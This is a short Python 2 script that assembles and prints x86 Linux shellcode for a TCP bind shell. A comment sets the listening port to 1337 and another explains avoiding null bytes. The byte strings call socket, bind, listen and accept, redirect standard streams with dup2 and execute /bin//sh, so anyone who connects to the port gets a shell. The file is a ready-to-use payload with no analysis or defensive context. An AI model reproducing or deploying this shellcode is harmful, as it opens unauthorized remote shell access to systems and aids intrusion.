#!/usr/bin/python

#insert port in hex, avoid null values (00)
#number 1337 in hex is 539, write it signed in 2's complement - 0539
port = "\\x05\\x39"


shellcode = ""
shellcode1 = "\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x66\\xb8\\x67\\x01\\xb3\\x02\\xb1\\x01\\xcd\\x80\\x89\\xc6\\x52\\x52\\x52\\x66\\x68"

shellcode2 = "\\x66\\x6a\\x02\\x89\\xe1\\xb2\\x10\\x89\\xf3\\x31\\xc0\\x66\\xb8\\x69\\x01\\xcd\\x80\\x31\\xc0\\x89\\xf3\\x31\\xc9\\x66\\xb8\\x6b\\x01\\xcd\\x80\\x31\\xc0\\x89\\xf3\\x31\\xc9\\x89\\xca\\x89\\xc6\\x66\\xb8\\x6c\\x01\\xcd\\x80\\x31\\xdb\\x89\\xc3\\x31\\xc0\\xb0\\x3f\\x31\\xc9\\xcd\\x80\\x31\\xc0\\xb0\\x3f\\x41\\xcd\\x80\\x31\\xc0\\xb0\\x3f\\x41\\xcd\\x80\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x55\\x89\\xe1\\xb0\\x0b\\xcd\\x80"


shellcode = shellcode1 + port + shellcode2
	
print shellcode
